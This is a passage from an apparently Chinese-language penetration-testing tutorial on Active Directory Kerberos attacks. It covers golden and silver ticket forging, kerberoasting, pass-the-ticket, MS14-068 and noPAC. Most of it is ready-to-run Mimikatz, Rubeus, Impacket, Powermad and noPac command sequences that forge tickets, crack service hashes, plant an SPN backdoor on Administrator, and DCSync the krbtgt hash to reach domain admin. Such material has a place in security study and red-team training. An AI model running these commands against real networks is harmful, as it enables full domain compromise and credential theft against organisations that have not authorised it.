class=\"line\">&#x2F;sids - AD森林中账户&#x2F;组的额外SID，凭证拥有权限进行欺骗。通常这将是根域Enterprise Admins组的S-1-5-21-1473643419-774954089-5872329127-519值</span><br><span class=\"line\">&#x2F;user - 伪造的用户名</span><br><span class=\"line\">&#x2F;groups（可选）- 用户所属的组RID（第一组是主组）,添加用户或计算机帐户RID以接收相同的访问权限,默认组：513,512,520,518,519为默认的管理员组</span><br><span class=\"line\">&#x2F;krbtgt - 域KRBTGT的NTLM</span><br><span class=\"line\">&#x2F;ticket（可选）- 提供一个路径和名称，用于保存Golden Ticket文件</span><br><span class=\"line\">&#x2F;ptt - 将伪造的票据插入到内存中以供使用</span><br><span class=\"line\">&#x2F;id（可选）- 用户RID, Mimikatz默认值是500</span><br><span class=\"line\">&#x2F;startoffset（可选）- 票据可用时的起始偏移量,Mimikatz默认值是0</span><br><span class=\"line\">&#x2F;endin（可选）- 票据使用时间范围。Mimikatz默认值是10年,Active Directory默认Kerberos策略设置为10小时</span><br><span class=\"line\">&#x2F;renewmax（可选）- 续订最长票据有效期。Mimikatz默认值是10年,Active Directory默认Kerberos策略设置为7天</span><br><span class=\"line\">&#x2F;aes128 - AES128密钥</span><br><span class=\"line\">&#x2F;aes256 - AES256密钥</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. Rubeus</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe dump &#x2F;nowrap &#x2F;service:krbtgt &gt; ticket.kirbi</span><br><span class=\"line\">Rubeus.exe golden &#x2F;krbtgt:&lt;KRBTGT_HASH&gt; &#x2F;domain:test.com &#x2F;sid:&lt;DOMAIN_SID&gt; &#x2F;user:Administrator &#x2F;nowrap</span><br></pre></td></tr></table></figure>\n\n<p><strong>3. Impacket</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Find the domain SID</span><br><span class=\"line\">lookupsid.py -hashes &#39;LMhash:NThash&#39; &#39;DOMAIN&#x2F;DomainUser@DomainController&#39; 0</span><br><span class=\"line\"></span><br><span class=\"line\"># Create the golden ticket with ntlm</span><br><span class=\"line\">ticketer.py -nthash &quot;$krbtgtNThash&quot; -domain-sid &quot;$domainSID&quot; -domain &quot;$DOMAIN&quot; &quot;randomuser&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Create the golden ticket with aeskey</span><br><span class=\"line\">ticketer.py -aesKey &quot;$krbtgtAESkey&quot; -domain-sid &quot;$domainSID&quot; -domain &quot;$DOMAIN&quot; &quot;randomuser&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Create the golden ticket with custom user&#x2F;groups ids</span><br><span class=\"line\">ticketer.py -nthash &quot;$krbtgtNThash&quot; -domain-sid &quot;$domainSID&quot; -domain &quot;$DOMAIN&quot; -user-id &quot;$USERID&quot; -groups &quot;$GROUPID1,$GROUPID2,...&quot; &quot;randomuser&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># linux下导入票据到内存</span><br><span class=\"line\">export KRB5CCNAME&#x3D;administrator.ccache</span><br><span class=\"line\"></span><br><span class=\"line\"># PTT横向</span><br><span class=\"line\">python3 secretsdump.py dc1.test.com -k -no-pass</span><br></pre></td></tr></table></figure>\n\n<p>user-id 和 groups-ids 是为了应对某些特殊情况：默认情况下，impacket和mimikatz伪造的票证包含 PAC，表明用户属于某些知名管理员组（即组 ID 513、512、520、518、519），在某些情况下，这些组是不够的（即使是域管理员也没有本地管理员权限的特殊机器）</p>\n<p><strong>4. Metasploit</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">post&#x2F;windows&#x2F;escalate&#x2F;golden_ticket</span><br><span class=\"line\">auxiliary&#x2F;admin&#x2F;kerberos&#x2F;forge_ticket</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"TGS-REQ-amp-TGS-REP\"><a href=\"#TGS-REQ-amp-TGS-REP\" class=\"headerlink\" title=\"TGS_REQ &amp; TGS_REP\"></a>TGS_REQ &amp; TGS_REP</h1><h2 id=\"kerberoasting\"><a href=\"#kerberoasting\" class=\"headerlink\" title=\"kerberoasting\"></a>kerberoasting</h2><p>攻击原理：在TGS_REQ中的sname是要请求的服务SPN，如果发送的TGT正确，在TGS_REP阶段 <strong>返回由SPN服务对应账号hash加密的ST，此时可以导出该ST进行本地破解逆推出SPN服务对应的账户hash</strong></p>\n<hr>\n<p>SPN（ServicePrincipal Names - 服务主体名称）是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN，存在于账号的属性中</p>\n<p>SPN分为两种：</p>\n<ul>\n<li>注册在 <strong>AD上机器帐户(Computers)</strong> ：当一个服务的权限为 <code>Local System</code> 或 <code>Network Service</code></li>\n<li>注册在 <strong>域用户帐户(Users)</strong> ：当一个服务的权限为一个域用户</li>\n</ul>\n<p>域内主要账号类型：</p>\n<ul>\n<li><p>用户账户（User Accounts）</p>\n<ul>\n<li>用途：供个人用户登录域、访问资源</li>\n<li>示例：<a href=\"mailto:&#x7a;&#104;&#97;&#x6e;&#103;&#x73;&#97;&#110;&#x40;&#100;&#111;&#109;&#x61;&#105;&#x6e;&#46;&#x63;&#x6f;&#109;\">&#x7a;&#104;&#97;&#x6e;&#103;&#x73;&#97;&#110;&#x40;&#100;&#111;&#109;&#x61;&#105;&#x6e;&#46;&#x63;&#x6f;&#109;</a>、Administrator</li>\n<li>特点：<ul>\n<li>密码由用户设置或管理员分配，可能绑定邮箱、权限组等</li>\n<li>可手动关联SPN（此时称为 <code>服务用户账户</code>）</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>计算机账户（Computer Accounts）</p>\n<ul>\n<li><p>用途：代表 加入域的计算机或服务器，用于身份验证和资源访问</p>\n</li>\n<li><p>示例：DC01$、SQLSERVER$（以$结尾）</p>\n</li>\n<li><p>特点：</p>\n<ul>\n<li>密码由系统自动管理（定期更新），安全性较高</li>\n<li>自动注册SPN（如 HOST/DC01.domain.com、MSSQLSvc/sqlserver.domain.com:1433、TERMSRV/rdp-server.domain.com）</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>服务账户（Service Accounts）</p>\n<ul>\n<li><p>技术本质：并非独立账号类型，而是用户账户或计算机账户的一种用途。</p>\n</li>\n<li><p>分类：</p>\n<ul>\n<li>普通用户账户：手动配置为服务运行身份（如svc_sql），需关联SPN，密码人工维护（易成Kerberoasting攻击目标）</li>\n<li>组托管服务账户（gMSA）：专用服务账户类型，密码由AD自动管理（Windows Server 2012+），安全性更高</li>\n<li>计算机账户：服务以SYSTEM或Network Service运行时，隐式使用计算机账户身份</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>攻击步骤：</strong></p>\n<p>一、收集域内高价值SPN：1. 注册在域用户帐户(Users)下。2. 该域用户账户的权限高</p>\n<p>二、请求指定TGS</p>\n<p>三、导出TGS</p>\n<p>四、本地破解</p>\n<p>本地测试为域用户Bob添加一个SPN属性</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250216000120178.png\" alt=\"image-20250216000120178\"></p>\n<p><strong>工具：</strong></p>\n<p><strong>1. impacket</strong></p>\n<p>GetUserSPNs可以实现自动化查询、请求TGS</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 只查询SPN</span><br><span class=\"line\">python GetUserSPNs.py test.com&#x2F;tom:Ab123456 -dc-ip 192.168.100.128</span><br><span class=\"line\"># 导出指定用户TGS</span><br><span class=\"line\">python GetUserSPNs.py test.com&#x2F;tom:Ab123456 -dc-ip 192.168.100.128 -request-user Bob</span><br><span class=\"line\"># 导出所有用户TGS</span><br><span class=\"line\">python GetUserSPNs.py test.com&#x2F;tom:Ab123456 -dc-ip 192.168.100.128 -request</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250216001108155.png\" alt=\"image-20250216001108155\"></p>\n<p><strong>2. Rubeus</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe kerberoast &#x2F;nowrap &#x2F;format:hashcat</span><br></pre></td></tr></table></figure>\n\n<p>如果在未禁用RC4情况下启用了AES加密，即msDS-SupportedEncryptionTypes属性被设置了AES，当kerberoast时，返回的票据为AES加密，这时添加 <code>/tgtdeleg</code> 参数可以实现加密类型的降级，强迫返回票据使用RC4进行加密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe kerberoast &#x2F;tgtdeleg &#x2F;nowrap &#x2F;format:hashcat</span><br></pre></td></tr></table></figure>\n\n<p><strong>John、hashcat</strong></p>\n<p>本地破解</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashcat -m 13100 -a 0 1.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force</span><br></pre></td></tr></table></figure>\n\n<p><strong>后门利用</strong></p>\n<p>在取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令，例如为域用户Administrator添加SPNVNC/DC1.test.com：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">setspn.exe -U -A SPNVNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"白银票据\"><a href=\"#白银票据\" class=\"headerlink\" title=\"白银票据\"></a>白银票据</h2><p>攻击原理：在TGS_REP阶段返回使用服务账户hash加密的TGS票据，如果有了服务账户的hash，可以<strong>直接伪造TGS票据从而直接访问该指定的服务</strong>，用作一种权限维持手法，注意的是银票只能访问特定的服务</p>\n<hr>\n<p><strong>白银票据特点：</strong></p>\n<ul>\n<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务</li>\n<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>\n<li>任何事件日志都在目标服务器上</li>\n</ul>\n<p><strong>制作银票条件：</strong></p>\n<ul>\n<li>域名称</li>\n<li>域的SID值</li>\n<li>域中的Server服务器账户的 NTLM Hash 或 AES-256 或 AES-128</li>\n<li>伪造的任意用户名</li>\n<li>目标服务器上面的kerberos服务名</li>\n</ul>\n<p><strong>常见的服务：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">服务名称                    同时需要的服务</span><br><span class=\"line\">WMI                        HOST、RPCSS</span><br><span class=\"line\">PowerShell Remoting        HOST、HTTP</span><br><span class=\"line\">WinRM                      HOST、HTTP</span><br><span class=\"line\">Scheduled Tasks            HOST</span><br><span class=\"line\">Windows File Share         CIFS</span><br><span class=\"line\">LDAP  DCSync               LDAP</span><br><span class=\"line\">Windows Remote Server      RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure>\n\n<hr>\n<p><strong>攻击步骤：</strong></p>\n<p>一、获取所需条件信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">域名：test.com</span><br><span class=\"line\">域SID：S-1-5-21-3222783777-1006235836-3661351843</span><br><span class=\"line\">服务器账户：域控的机器账户：DC-1$</span><br><span class=\"line\">hash：43659c20b609efca43cecfe5e04fea8b</span><br><span class=\"line\">伪造的任意用户名：Administrator</span><br><span class=\"line\">服务名：CIFS</span><br></pre></td></tr></table></figure>\n\n<p>二、工具</p>\n<p><strong>1. Mimikatz</strong></p>\n<p>CIFS服务为远程文件服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::golden &#x2F;domain:test.com &#x2F;sid:S-1-5-21-3222783777-1006235836-3661351843 &#x2F;target:DC-1.test.com &#x2F;service:cifs &#x2F;rc4:43659c20b609efca43cecfe5e04fea8b &#x2F;user:silver &#x2F;ptt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250217075544211.png\" alt=\"image-20250217075544211\"></p>\n<p>LDAP服务可远程dcsync</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::golden &#x2F;user:t &#x2F;domain:test.com &#x2F;sid:S-1-5-21-3222783777-1006235836-3661351843 &#x2F;target:DC-1.test.com &#x2F;service:ldap &#x2F;rc4:43659c20b609efca43cecfe5e04fea8b &#x2F;user:DCsync &#x2F;ptt</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync &#x2F;dc:DC-1 &#x2F;domain:test.com &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250217081303883.png\" alt=\"image-20250217081303883\"></p>\n<p><strong>2. Rubeus</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">rubeus.exe silver &#x2F;service:MSSQLSvc&#x2F;MSSQL.test.com &#x2F;rc4:43659c20b609efca43cecfe5e04fea8b &#x2F;sid:S-1-5-21-3222783777-1006235836-3661351843 &#x2F;user:mssql &#x2F;domain:test.com &#x2F;ptt</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"金-银票对比\"><a href=\"#金-银票对比\" class=\"headerlink\" title=\"金/银票对比\"></a>金/银票对比</h1><table>\n<thead>\n<tr>\n<th>特性</th>\n<th>黄金票据</th>\n<th>白银票据</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>作用对象</td>\n<td>伪造TGT（Ticket Granting Ticket）</td>\n<td>伪造特定服务的ST（Service Ticket）</td>\n</tr>\n<tr>\n<td>依赖凭据</td>\n<td>KRBTGT账户的哈希</td>\n<td>服务账户（如机器账户）的哈希</td>\n</tr>\n<tr>\n<td>权限范围</td>\n<td>可访问域内所有服务</td>\n<td>仅能访问特定服务（如CIFS、LDAP等）</td>\n</tr>\n<tr>\n<td>隐蔽性</td>\n<td>需与KDC交互获取服务票据，可能触发日志</td>\n<td>无需与KDC交互，更隐蔽</td>\n</tr>\n<tr>\n<td>后门持久性</td>\n<td>长期有效（直到KRBTGT密码重置）</td>\n<td>有效期受服务账户密码（如机器账户30天重置）影响</td>\n</tr>\n</tbody></table>\n<h1 id=\"PTT\"><a href=\"#PTT\" class=\"headerlink\" title=\"PTT\"></a>PTT</h1><p>攻击原理：在kerberos认证中，除了AS_ERQ外其余步骤都是利用票据进行身份验证，因此利用票据（TGT、TGS）的导出/导入/注入/横向移动都叫 PTT</p>\n<p><strong>工具：</strong></p>\n<p><strong>1. mimikatz</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">klist\t\t\t查看内存中票据</span><br><span class=\"line\">klist purge  \t清除票据</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz：</span><br><span class=\"line\">kerberos::purge  &#x2F;&#x2F; 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class=\"line\">kerberos::list   &#x2F;&#x2F; 查看当前机器凭证</span><br><span class=\"line\">sekurlsa::tickets &#x2F;export\t&#x2F;&#x2F; 导出内存票据</span><br><span class=\"line\">kerberos::ptc $ticket.ccache   &#x2F;&#x2F; 将ccache票据注入到内存中</span><br><span class=\"line\">kerberos::ptt $ticket.kirbi   &#x2F;&#x2F; 将kirbi格式票据注入到内存中</span><br><span class=\"line\"></span><br><span class=\"line\">getTGT.py test.com&#x2F;administrator:Abc@123.. &#x2F;&#x2F; 生成administrator的TGT票据</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. Rubeus</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe ptt &#x2F;ticket:&quot;base64 | file.kirbi&quot;</span><br></pre></td></tr></table></figure>\n\n<p>UNIX &lt;-&gt; Windows的票据转换</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Windows -&gt; UNIX</span><br><span class=\"line\">ticketConverter.py $ticket.kirbi $ticket.ccache</span><br><span class=\"line\"></span><br><span class=\"line\"># UNIX -&gt; Windows</span><br><span class=\"line\">ticketConverter.py $ticket.ccache $ticket.kirbi</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"PAC\"><a href=\"#PAC\" class=\"headerlink\" title=\"PAC\"></a>PAC</h1><h2 id=\"MS14068\"><a href=\"#MS14068\" class=\"headerlink\" title=\"MS14068\"></a>MS14068</h2><p>域内提权漏洞，允许远程经过身份验证的域用户通过票证中的伪造签名获取域管理员权限，影响 Windows Server 2003 ~ Windows Server 2012 R2。</p>\n<p>大概原理：</p>\n<ul>\n<li>作为标准用户请求不带 PAC 的 Kerberos TGT 身份验证票证，DC 使用 TGT 回复（没有 PAC，通常包含组成员身份，这种情况很不寻常）</li>\n<li>生成一个伪造的 PAC，没有密钥，因此生成的 PAC 使用域用户的密码数据通过 MD5 算法而不是 HMAC_MD5 进行 “签名”</li>\n<li>将无 PAC 的 TGT 与伪造的 PAC 一起作为授权数据 (Authorization-Data) 作为 TGS 服务票证请求的一部分发送到 DC</li>\n<li>DC 似乎对此感到困惑，因此它丢弃用户发送的没有 PAC 的 TGT，创建一个新的 TGT 并将伪造的 PAC 插入到自己的授权数据 (Authorization-Data) 中，然后将此 TGT 发送给用户</li>\n<li>此带有伪造 PAC 的 TGT 使用户能够成为易受攻击的 DC 上的域管理员</li>\n</ul>\n<p>补丁号: KB3011780</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">systeminfo |findstr &quot;KB3011780&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">wmic qfe GET hotfixid |findstr &quot;KB3011780&quot;</span><br></pre></td></tr></table></figure>\n\n<p><strong>工具：</strong></p>\n<p><strong>1. impacket</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">goldenPac.py &quot;$DOMAIN_FQDN&quot;&#x2F;&quot;$USER&quot;:&quot;$PASSWORD&quot;@&quot;$DC_HOST&quot; -dc-ip &quot;$DC_IP&quot;</span><br><span class=\"line\">python goldenPac.py test.com&#x2F;Bob:Ab123456@DC-1.test.com -dc-ip 192.168.100.128 -debug</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. pykek</strong></p>\n<p><a href=\"https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068\">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:test.com &#x2F;user:Bob &#x2F;password:Ab123456 &#x2F;ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"noPAC\"><a href=\"#noPAC\" class=\"headerlink\" title=\"noPAC\"></a>noPAC</h2><p>域内提权漏洞：利用两个CVE漏洞组合在S4U的条件下会生成一个高权限PAC到ST中。</p>\n<ul>\n<li><p>CVE-2021-42278，机器账户应该以$结尾，但AD没有对域内机器账户名做验证</p>\n</li>\n<li><p>CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后 <strong>通过S4U2self</strong> 申请TGS Ticket，然后DC进行在TGS_REP阶段加密TGS Ticket时，无法找到该账户利用机器账户hash加密，会在 sAMAccountName 结尾加入 $ 继续查询，此时寻找到了DC$机器账户，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。</p>\n</li>\n</ul>\n<p><strong>ms-ds-machineaccountquota（MAQ）：允许用户在域中创建的计算机帐户数，默认为10</strong></p>\n<p><strong>sAMAccountName：域名\\用户名</strong></p>\n<hr>\n<p>攻击流程：</p>\n<ul>\n<li><p>创建一个机器账户</p>\n</li>\n<li><p>清除机器账户的SPN（servicePrincipalName）属性。使用 <strong>impacket 或 powermad</strong> 是利用SAMR协议创建机器账户，这个方法所创建的机器账户没有SPN，所以不用清除</p>\n</li>\n<li><p>将机器账户的 <strong>sAMAccountName</strong>，更改为DC的机器账户名字，注意后缀不带$</p>\n</li>\n<li><p>为机器账户请求TGT</p>\n</li>\n<li><p>将创建的机器账户的 <strong>sAMAccountName</strong> 更改为其他名字</p>\n</li>\n<li><p>通过 <strong>S4U2self</strong> 协议向DC请求ST</p>\n</li>\n<li><p>DCsync</p>\n</li>\n</ul>\n<p><strong>检测工具：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">noPac.exe scan -domain redteam.red -user saul -pass &#39;Red12345&#39;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">netexec smb 10.10.10.10 -u &#39;&#39; -p &#39;&#39; -d domain -M nopac</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackmapexec smb &lt;ip&gt; -u &#39;user&#39; -p &#39;pass&#39; -M nopac</span><br></pre></td></tr></table></figure>\n\n<p><strong>利用工具：</strong></p>\n<p><strong>1. Powermad</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># test.com是域名 , DC-1是DC的机器名称</span><br><span class=\"line\"># nopac是新建的机器名 , 1qaz@WSX是新建的机器用户的密码</span><br><span class=\"line\"># Base64 TGT是Rubeus.exe获取的TGT结果</span><br><span class=\"line\"></span><br><span class=\"line\">import-module .\\Powermad.ps1</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建机器用户</span><br><span class=\"line\">$password &#x3D; ConvertTo-SecureString &#39;1qaz@WSX&#39; -AsPlainText -Force</span><br><span class=\"line\">New-MachineAccount -MachineAccount &quot;nopac&quot; -Password $($password) -Domain &quot;test.com&quot; -DomainController &quot;DC-1.test.com&quot; -Verbose</span><br><span class=\"line\"></span><br><span class=\"line\"># 清除机器用户的SPN</span><br><span class=\"line\">Import-Module .\\powerview.ps1</span><br><span class=\"line\">Set-DomainObject &quot;CN&#x3D;nopac,CN&#x3D;Computers,DC&#x3D;hacker,DC&#x3D;lab&quot; -Clear &#39;serviceprincipalname&#39; -Verbose</span><br><span class=\"line\"></span><br><span class=\"line\"># 将机器用户名修改为DC的用户名。注意不带$符号</span><br><span class=\"line\">Set-MachineAccountAttribute -MachineAccount &quot;nopac&quot; -Value &quot;DC-1&quot; -Attribute samaccountname -Verbose</span><br><span class=\"line\"></span><br><span class=\"line\"># 查看机器用户名是否修改成功</span><br><span class=\"line\">Get-DomainObject &quot;CN&#x3D;nopac,CN&#x3D;Computers,DC&#x3D;hacker,DC&#x3D;lab&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用Rubeus用机器账号向DC请求TGT</span><br><span class=\"line\">Rubeus.exe asktgt &#x2F;user:&quot;DC-1&quot; &#x2F;password:&quot;1qaz@WSX&quot; &#x2F;domain:&quot;test.com&quot; &#x2F;dc:&quot;DC-1.test.com&quot; &#x2F;nowrap</span><br><span class=\"line\"></span><br><span class=\"line\"># 将机器用户名重置为原来的用户名</span><br><span class=\"line\">Set-MachineAccountAttribute -MachineAccount &quot;nopac&quot; -Value &quot;nopac&quot; -Attribute samaccountname -Verbose</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用请求的TGT通过S4U2self获取ST 注意，impersonateuser必须要存在才有效，如果域内administrator被禁用，换成其他域管</span><br><span class=\"line\">Rubeus.exe s4u &#x2F;self &#x2F;impersonateuser:&quot;administrator&quot; &#x2F;altservice:&quot;ldap&#x2F;DC-1.test.com&quot; &#x2F;dc:&quot;DC-1.test.com&quot; &#x2F;ptt &#x2F;ticket:[Base64 TGT]</span><br><span class=\"line\"></span><br><span class=\"line\"># 可选命令，查看获取的ST</span><br><span class=\"line\">klist</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用Mimikatz进行Dcsync</span><br><span class=\"line\">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:test.com &#x2F;kdc:DC-1.test.com &#x2F;user:krbtgt&quot; &quot;exit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 可选命令，清除所有的ST</span><br><span class=\"line\">klist purge</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. impacket</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 0. create a computer account</span><br><span class=\"line\">addcomputer.py -computer-name &#39;ControlledComputer$&#39; -computer-pass &#39;ComputerPassword&#39; -dc-host DC01 -domain-netbios domain &#39;domain.local&#x2F;user1:complexpassword&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. clear its SPNs</span><br><span class=\"line\">addspn.py --clear -t &#39;ControlledComputer$&#39; -u &#39;domain\\user&#39; -p &#39;password&#39; &#39;DomainController.domain.local&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. rename the computer (computer -&gt; DC)</span><br><span class=\"line\">renameMachine.py -current-name &#39;ControlledComputer$&#39; -new-name &#39;DomainController&#39; -dc-ip &#39;DomainController.domain.local&#39; &#39;domain.local&#39;&#x2F;&#39;user&#39;:&#39;password&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. obtain a TGT</span><br><span class=\"line\">getTGT.py -dc-ip &#39;DomainController.domain.local&#39; &#39;domain.local&#39;&#x2F;&#39;DomainController&#39;:&#39;ComputerPassword&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"># 4. reset the computer name</span><br><span class=\"line\">renameMachine.py -current-name &#39;DomainController&#39; -new-name &#39;ControlledComputer$&#39; &#39;domain.local&#39;&#x2F;&#39;user&#39;:&#39;password&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"># 5. obtain a service ticket with S4U2self by presenting the previous TGT</span><br><span class=\"line\">KRB5CCNAME&#x3D;&#39;DomainController.ccache&#39; </span><br><span class=\"line\">getST.py -self -impersonate &#39;DomainAdmin&#39; -altservice &#39;cifs&#x2F;DomainController.domain.local&#39; -k -no-pass -dc-ip &#39;DomainController.domain.local&#39; &#39;domain.local&#39;&#x2F;&#39;DomainController&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"># 6. DCSync by presenting the service ticket</span><br><span class=\"line\">KRB5CCNAME&#x3D;&#39;DomainAdmin.ccache&#39; </span><br><span class=\"line\">secretsdump.py -just-dc-user &#39;krbtgt&#39; -k -no-pass -dc-ip &#39;DomainController.domain.local&#39; @&#39;DomainController.domain.local&#39;</span><br></pre></td></tr></table></figure>\n\n<p><strong>3. noPac.exe</strong></p>\n<p><a href=\"https://github.com/TryA9ain/noPac\">https://github.com/TryA9ain/noPac</a></p>\n<p><a href=\"https://github.com/cube0x0/noPac\">https://github.com/cube0x0/noPac</a></p>\n<p><a href=\"https://github.com/Ridter/noPac\">https://github.com/Ridter/noPac</a></p>\n<p><a href=\"https://github.com/safebuffer/sam-the-admin\">https://github.com/safebuffer/sam-the-admin</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 使用指定的用户密码扫描域内是否存在能利用该漏洞的DC</span><br><span class=\"line\">noPac.exe scan -domain test.com -user &quot;Bob&quot; -pass &quot;Ab123456&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用一键化工具获得域控cifs的权限</span><br><span class=\"line\">noPac.exe -domain test.com -user &quot;Bob&quot; -pass &quot;Ab123456&quot; &#x2F;dc DC-1.test.com &#x2F;mAccount nopac1 &#x2F;mPassword 1qaz@WSX &#x2F;service cifs &#x2F;ptt</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用一键化工具获得域控ldap服务的权限，同样此处的impersonate和手动利用方式一致，需要该用户可用</span><br><span class=\"line\">noPac.exe -domain test.com -user &quot;Bob&quot; -pass &quot;Ab123456&quot; &#x2F;dc DC-1.test.com &#x2F;mAccount nopac2 &#x2F;mPassword 1qaz@WSX &#x2F;service ldap &#x2F;ptt &#x2F;impersonate Administrator</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用dcsync导出域内krbtgt密码</span><br><span class=\"line\">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:test.com &#x2F;user:krbtgt &#x2F;csv&quot; &quot;exit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">python noPac.py &#39;domain.local&#x2F;user&#39; -hashes &#39;:31d6cfe0d16ae931b73c59d7e0c089c0&#39; -dc-ip 10.10.10.10 -use-ldap -dump</span><br><span class=\"line\"></span><br><span class=\"line\">python3 sam_the_admin.py &quot;domain&#x2F;user:password&quot; -dc-ip 10.10.10.10 -shell</span><br></pre></td></tr></table></figure>\n\n<hr>\n<p><strong>在MAQ = 0 时便不能创建计算机帐户的突破：</strong></p>\n<ul>\n<li><p>拿到 <strong>将计算机拉入域中的帐户</strong> 的权限：将计算机拉入域中的帐户默认对该计算机帐户有 WriteProperty 权限, 计算机帐户中的 mS-DS-CreatorSID 这个属性的 SID 就是拉它入域的 <strong>用户 SID</strong>, 那么便可以去 <strong>查找域内存在 mS-DS-CreatorSID 的计算机帐户, 然后对应找到域用户帐户, 再拿到其域用户帐户权限</strong> 后便可修改对应的计算机帐户属性, 从而实现该漏洞的利用</p>\n</li>\n<li><p>拿到具有 <strong>SeMachineAccountPrivilege</strong> 权限的帐户：有的企业会设置专门用来 <strong>加入域的组</strong> (这个组中的这些帐户都能用来将计算机拉入域中) 或者 <strong>帐户</strong>, 这些帐户具有 SeMachineAccountPrivilege 权限 (“将工作站添加到域” 属性), 后续可以重点留意下这些帐户, 默认 Authenticater Users (身份验证的用户) 具备 